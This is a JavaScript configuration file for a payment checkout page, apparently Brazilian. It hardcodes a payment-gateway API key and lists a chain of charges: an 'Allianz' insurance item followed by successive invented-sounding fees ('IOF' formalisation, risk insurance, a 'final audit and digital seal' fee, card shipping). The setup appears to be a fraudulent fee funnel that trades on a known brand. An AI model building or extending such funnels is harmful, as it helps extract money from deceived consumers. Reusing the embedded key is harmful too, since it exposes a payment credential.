const GLOBAL_CONFIG = {
    activeGateway: 'bynet',

    gateways: {
        bynet: {
            api_key: '385e83cf-1a63-403e-8dc7-d5caa83c93c2'
        }
    },

    product: {
        amount: '39,86',
        name: 'Seguro Allianz'
    },
    upsell: {
        amount: '48,50',
        name: 'Taxa IOF - Formalização'
    },
    iof: {
        amount: '38,50',
        name: 'Taxa Seguro de Riscos Diversos'
    },
    icm: {
        amount: '55,00',
        name: 'Taxa Final de Auditoria e Selo Digital'
    },
    iphone: {
        amount: '24,90',
        name: 'Frete Expresso - Cartão CredPix Gold'
    }
};

const _IS_LOCAL = ['127.0.0.1', 'localhost'].includes(window.location.hostname);
const API_BASES = {
    bynet: _IS_LOCAL ? 'https://api-gateway.techbynet.com' : '/api/bynet.php?path='
};

function getUtmMetadata() {
    try {
        const params = new URLSearchParams(window.location.search);
        const keys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term'];
        const utms = {};
        keys.forEach(function(k) {
            const fromUrl = params.get(k);
            if (fromUrl) { localStorage.setItem(k, fromUrl); utms[k] = fromUrl; }
            else { const saved = localStorage.getItem(k); if (saved) utms[k] = saved; }
        });
        return JSON.stringify(utms);
    } catch(e) { return '{}'; }
}
